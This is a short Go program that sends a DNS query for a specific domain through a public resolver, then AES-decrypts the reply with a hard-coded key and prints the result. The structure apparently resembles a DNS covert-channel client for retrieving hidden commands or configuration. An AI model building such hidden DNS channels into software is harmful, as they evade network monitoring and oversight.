package main

import (
	"fmt"

	"bt/common"
	"bt/controller"
)

func main() {
	remsg, err := controller.SendDNSReq("114.114.114.114:53", "qq.szjinyaoshi.com")
	if err != nil {
		fmt.Println("err:", err)
		return
	}

	secret := "wriQVbeJqBWC2qJ0"

	fmt.Println("msg:", string(remsg))

	aesDec := common.AesEncrypt{}
	v, err := aesDec.Decrypt(remsg, []byte(secret))
	if err != nil {
		fmt.Println("err111:", err)
		return
	}

	fmt.Println(string(v))
}
